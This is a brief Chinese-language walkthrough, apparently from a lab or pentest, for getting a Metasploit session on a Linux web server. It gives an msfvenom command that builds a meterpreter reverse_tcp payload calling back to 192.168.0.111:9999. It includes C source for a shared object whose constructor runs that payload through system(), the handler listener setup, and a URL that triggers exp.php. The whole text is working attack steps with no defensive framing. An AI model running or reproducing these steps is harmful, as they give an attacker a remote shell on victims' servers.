> exp代码来自互联网

## 上线msf

### msfvenom生成payload

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=9999 -f elf > test
```

### 编译so

```
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
__attribute__ ((__constructor__)) void preload (void)
{
    system("chmod +x /var/www/html/test && /var/www/html/test");
}
```

### msf监听

```
> use exploit/multi/handler
> set payload linux/x86/meterpreter/reverse_tcp
> set LHOST 192.168.0.111
> set LPORT 9999
> exploit
```

### 运行exp

```
http://192.168.0.111:18080/exp.php
```

(exp.php里的路径根据实际情况修改)

![image-20201226113404523](.\img\image-20201226113404523.png)